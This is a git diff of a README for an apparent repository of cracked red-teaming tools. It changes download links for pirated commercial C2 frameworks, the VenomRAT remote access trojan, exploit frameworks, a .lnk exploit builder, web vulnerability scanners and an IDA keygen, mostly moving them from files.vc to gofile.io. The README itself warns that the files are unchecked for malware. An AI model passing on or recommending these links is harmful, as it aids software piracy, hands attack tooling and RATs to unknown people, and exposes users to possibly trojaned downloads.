@@ -1,5 +1,5 @@
 # ⚠️ WARNING ⚠️
-As of 1/27/2024 these tools will not be checked for malware using any sort of environment, you are responsible for any damages done to your computer, run these strictly in a VM environment.<br><br>Make sure to read notes at the bottom before opening any issue.<br>The files hosted on `file.vc` will expire after 3 months - after which I will re-upload the tools / upload updated versions. This is on purpose.
+As of 1/27/2024 these tools will not be checked for malware using any sort of environment, you are responsible for any damages done to your computer, run these strictly in a VM environment.<br><br>Make sure to read notes at the bottom before opening any issue.<br>Files hosted on `files.vc` were replaced with `gofile.io` due to connection-related issues - files may not last long due to takedowns.
 
 # Cracked Red Teaming Tools.
 This is a full collection of red teaming tools which have been cracked by other people, if you need me to find anything, let me know via the issues tab.
@@ -16,13 +16,13 @@ Sandboxing is useful when it comes to testing whether or not the tools contain m
 | CUCKOO | [cuckoo.cert.ee](https://cuckoo.cert.ee/) | A non-interactive completely (login-)free online sandbox, appears to have no file size limit and I have rarely used it personally. |
 
 ### 🐀 C2/RATs 🐀
-##### Windows
+##### Windows/Linux (W - Windows , L - Linux)
 | Tool | Link |
 | :--- | ---: |
-| Cobalt Strike v4.9.1 | [Download](https://gofile.io/d/U25hhJ) |
-| Brute-Ratel v1.4.5 (Blitzkrieg) | [Download](https://files.vc/d/dl?hash=73e9a2f6a25766fbee96a8013ca3078b) |
-| SpecterInsightC2 | [Download](https://files.vc/d/dl?hash=f1dcb8aa31472584ebd69aecd75bf8fb) |
-| VenomRAT v6.0.1 | [Download](https://pixeldrain.com/u/xVXeWbWb) |
+| [W/L] Cobalt Strike v4.9.1 | [Download](https://gofile.io/d/U25hhJ) |
+| [L] Brute-Ratel v1.4.5 (Blitzkrieg) | [Download](https://gofile.io/d/ShLifR) |
+| [W] SpecterInsightC2 | [Download](https://gofile.io/d/hXLmhm) |
+| [W] VenomRAT v6.0.1 | [Download](https://pixeldrain.com/u/xVXeWbWb) |
 
 ##### Android
 | Tool | Link |
@@ -38,38 +38,38 @@ Sandboxing is useful when it comes to testing whether or not the tools contain m
 | Immunity CANVAS v7.27 | [Download](https://pixeldrain.com/u/u8SeCmNe) |
 | Quantum .lnk Exploit Builder (02-10-22) | [Download](https://pixeldrain.com/u/9zjpYNQn) |
 | JexBot v1.0 (READ NOTES) | [Download](https://pixeldrain.com/u/Ea8kF2Hh) |
-| MetaSploit Pro | [Download](https://files.vc/d/dl?hash=2738784a546cd5c3ab1729e7ab97d08f) |
+| MetaSploit Pro | [Download](https://gofile.io/d/gQgtpO) |
 
 ###### Linux
 | Tool | Link |
 | :--- | ---: |
-| MetaSploit Pro | [Download](https://files.vc/d/dl?hash=b81460cd83ec15ac42f9fe4e185aa840) |
+| MetaSploit Pro | [Download](https://gofile.io/d/kBRGeB) |
 
 <br><br>
 ### 🌐 Web App Security Tools 🌐
 ##### Windows
 | Tool | Link |
 | :--- | ---: |
-| Invicti Pro v25.5 | [Download](https://files.vc/d/dl?hash=50795fbfc708c9dacf2b06a2df84fb00) |
-| Burp Suite PRO v2023.12.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/burpsuite_installer_windows.bat)) | [Download](https://files.vc/d/dl?hash=68b86ad9640d408f9b95e45a1636a404) |
-| Acunetix v25.1.250204093 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/acunetix_installer_windows.bat)) | [Download](https://files.vc/d/dl?hash=a8fcbdef28e79c2e6da188b9e4026168) |
-| Xray Pro v1.9.11 | [Download](https://files.vc/d/dl?hash=dae1e8e16a5d352000694060da5bd1b0) |
-| Super-Xray v1.7 | [Download](https://files.vc/d/dl?hash=3c6a6eb58df1f878af7078acf40e8357)
-| HCL AppScan Standard v10.6.0.28408 | [Download](https://files.vc/d/dl?hash=b795beaa62ff585750b057c3165e5414) |
-| Nessus Professional v10.6.0 | [Download](https://files.vc/d/dl?hash=7c4a8396e8b27aa3ffdaea58c90e86f1) |
+| Invicti Pro v25.5 | [Download](https://gofile.io/d/K7zIaI) |
+| Burp Suite PRO v2023.12.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/burpsuite_installer_windows.bat)) | [Download](https://gofile.io/d/uG8jvZ) |
+| Acunetix v25.1.250204093 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/acunetix_installer_windows.bat)) | [Download](https://gofile.io/d/Gd9Xb9) |
+| Xray Pro v1.9.11 | [Download](https://gofile.io/d/MLldz9) |
+| Super-Xray v1.7 | [Download](https://gofile.io/d/BEM4eU)
+| HCL AppScan Standard v10.6.0.28408 | [Download](https://gofile.io/d/jT9CBX) |
+| Nessus Professional v10.6.0 | [Download](https://gofile.io/d/cgEYRS) |
 
 ##### Linux
 | Tool | Link |
 | :--- | ---: |
-| Acunetix v25.1.250204093 | [Download](https://files.vc/d/dl?hash=28692f94cf150ece0a89c1fd228f6ba7) |
-| Xray Pro v1.9.11 | [Download](https://files.vc/d/dl?hash=2f8b22db74dbe5b8718ceb0532112267) |
+| Acunetix v25.1.250204093 | [Download](https://gofile.io/d/GBQ5Wd) |
+| Xray Pro v1.9.11 | [Download](https://gofile.io/d/KOFf2E) |
 | Nessus Professional v10.5.4 | [Download (BASH SCRIPT)](https://cyberarsenal.org/zen/nessus_debian_only_not_for_ubuntu_latest.sh) |
 
 <br><br>
 ### 🕷️ Debugging / Decompilation Tools 🕷️
 | Tool | Link |
 | :--- | ---: |
-| IDA v9.1_250226 Keygen | [Download](https://files.vc/d/dl?hash=c283842e5c8c906951ec42c8e827b9a8) |
+| IDA v9.1_250226 Keygen | [Download](https://gofile.io/d/MOgQCb) |
 
 <br><br>
 # 📝 Notes 📝
